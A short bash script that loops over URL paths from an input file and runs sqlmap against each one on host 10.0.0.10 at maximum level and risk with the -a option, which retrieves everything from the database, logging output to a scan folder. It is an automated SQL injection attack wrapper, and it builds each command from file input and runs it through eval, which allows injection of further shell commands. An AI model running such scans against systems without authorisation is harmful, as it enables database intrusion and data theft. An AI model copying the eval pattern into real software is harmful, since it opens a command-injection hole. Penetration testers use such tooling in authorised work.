#!/bin/bash
filename="$1"
counter=0
rm -rf ./scan
mkdir scan
while read -r line
do
    myURL="$line"
    counter=$((counter+1))
    echo "python sqlmap.py -u 'https://10.0.0.10/$myURL' --batch --smart --level=5 --risk=3 -a -v -s ./scan/scan_report_$counter.txt --flush-session -t ./scan/scan_trace_$counter.txt --fresh-queries --eta"
    myCommand="python sqlmap.py -u 'https://10.0.0.10/$myURL' --batch --smart --level=5 --risk=3 -a -v -s ./scan/scan_report_$counter.txt --flush-session -t ./scan/scan_trace_$counter.txt --fresh-queries --eta > ./scan/scan_out_$counter.txt"
    eval $myCommand
done < "$filename"